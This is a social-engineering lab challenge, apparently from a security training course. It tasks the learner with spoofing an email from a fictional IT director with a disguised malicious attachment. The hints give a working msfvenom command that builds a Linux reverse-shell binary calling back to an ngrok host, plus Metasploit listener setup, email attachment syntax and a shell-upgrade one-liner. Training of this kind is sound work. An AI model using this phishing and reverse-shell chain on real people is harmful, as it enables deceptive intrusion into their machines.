# Social Engineering Challenge 3

----------------------

For this one, we're going to target Kylo Solo's trust in his boss, IT Director Scotty LaForge.

Your goal is to send an email TO Kylo Solo, FROM his boss Scotty, with an evil attachment. You should say the attachment is a patch Kylo needs to run to update his antivirus, or some such thing. 

Your attachment should be booby-trapped; it should grant you access to his machine using a reverse shell, or some such thing.

Frank Johnson (Chief Security Officer, Veritas Inc.)

NOTE - Kylo is super eager to please his boss. He will immediately open and run all attachments you send him. In this case, he doesn't have java/flash/a pdf reader installed, so you should probably send him a binary. Note that he's running a linux x64 machine.

----------------------

Stuck? 
----------------------
<details> 
  <summary>Click for hint 1</summary>
  
  msfvenom (which is installed on Kali linux) is an app that lets you craft a binary for any target OS/architecture. For Kylo, be sure to target x64 architecture and the linux platform. 
  
  ```
  msfvenom --platform linux -p linux/x64/shell/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=19358 -b "\x00" -f elf > ~/Desktop/runme
  ```

</details>

<details> 
  <summary>Click for hint 2</summary>
  If you use a shell/reverse_tcp exploit, you will need a publicly visible LHOST and LPORT (ngrok is great for that) when crafting the binary with msfvenom. Use something like `./ngrok tcp 443` to get your publicly available LHOST and LPORT.
  
  Then when using msfconsole to listen for the exploit's response, your LHOST and LPORT values there will be your localhost ones that ngrok points to - so LHOST for msfconsole should be 127.0.0.1 and LPORT 443. To get started in msfconsole, run `use exploit/multi/handler` and set your payload to the same one you ran in msfvenom - that should set it up to listen properly.
</details>

<details> 
  <summary>Click for hint 3</summary>
  To add an attachment in sendEmail, all you have to do is this: `-a "/root/Desktop/runme"` where runme is the executable file you want attached.
</details>

<details> 
  <summary>Click for hint 4</summary>
  If you obtained a shell to the remote server by using a reverse/tcp payload, it's not very pretty - make it more functional and pretty by running this in it:
  
  ```
  python -c "import pty; pty.spawn('/bin/bash');"
  ```
</details>



